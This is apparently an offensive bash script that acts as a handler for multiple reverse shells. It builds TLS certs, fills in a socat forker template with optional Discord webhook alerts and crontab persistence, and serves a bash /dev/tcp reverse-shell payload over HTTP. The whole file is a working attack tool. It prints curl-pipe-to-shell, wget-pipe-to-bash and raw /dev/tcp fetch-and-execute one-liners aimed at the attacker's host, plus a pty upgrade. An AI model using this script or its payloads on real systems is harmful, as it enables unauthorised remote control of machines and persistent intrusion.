#!/bin/bash
# heavily based on https://systemoverlord.com/2018/01/20/socat-as-a-handler-for-multiple-reverse-shells.html

for i in "$@"; do
    case $i in
    --lhost)
        LHOST="$2"
        shift;shift;
        ;;
    --lport)
        LPORT="$2"
        shift;shift;
        ;;
    --webport)
        WEBPORT="$2"
        shift;shift;
        ;;
    --dnotify)
        DNOTIFY="$2"
        shift;shift;
        ;;
    --persist)
        PERSIST=true
        ;;
    *)
        ;;
    esac
done

if [[ -z "$LHOST" ]] || [[ -z "$LPORT" ]] || [[ -z "$WEBPORT" ]];
then
    echo "Usage : $0 --lhost <LHOST> --lport <LPORT> --webport <WEBPORT> [--dnotify <WEBHOOK> ] [--persist]"
    echo "Demo 1: $0 --lhost X.X.X.X --lport 443 --webport 80"
    echo "Demo 2: $0 --lhost X.X.X.X --lport 443 --webport 80 --dnotify https://discord.com/api/webhooks/XXXX/YYYY --persist"
    exit 42
fi

if [[ -z "${TMUX}" ]]; then
    echo "Must be run in tmux"
    exit 42
fi

echo -e "\n\n\n[+] Generating tls certs and keys"
if [ -f server.pem ]; then
    echo "[+] Files already exist, using server.pem"
else
    rm server.key server.crt server.pem
    yes "" | openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
    cat server.key server.crt >server.pem
fi

cp socat-forker.sh.tpl socat-forker.sh
sed -i "s/LHOST/${LHOST}/g" socat-forker.sh
sed -i "s/WEBPORT/${WEBPORT}/g" socat-forker.sh
if [[ "$DNOTIFY" ]]; then
    echo "[+] Notification enabled on ${DNOTIFY}"
    sed -i "s#WEBHOOK#${DNOTIFY}#g" socat-forker.sh
else
    sed -i "/WEBHOOK/d" socat-forker.sh
    echo "[+] Notification not enabled"
fi

if [[ "$PERSIST" ]]; then
    echo "[+] Persistence enabled"
else
    echo "[+] Persistence disabled"
    sed -i "/crontab/d" socat-forker.sh
fi


TEMP=$(mktemp -d)
cat > ${TEMP}/index.html << EOF
bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'
EOF
tmux split-window -h "cd ${TEMP}; python3 -m http.server ${WEBPORT}"
echo "[+] If sh has been used (fallback) , upgrade to pty with"
echo "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
echo "[+] Reverse shell payload:"
echo "curl ${LHOST}:${WEBPORT}|sh"
echo "curl ${LHOST}:${WEBPORT}|bash"
echo "wget -q -O - ${LHOST}:${WEBPORT}|bash"
echo "exec 3<>/dev/tcp/${LHOST}/${WEBPORT}; echo -e \"GET / HTTP/1.1\r\nhost: ${LHOST}\r\nConnection: close\r\n\r\n\" >&3; cat <&3 | sed -e '1,7d' |bash"

socat TCP4-LISTEN:${LPORT},reuseaddr,fork EXEC:./socat-forker.sh,pty,echo=0
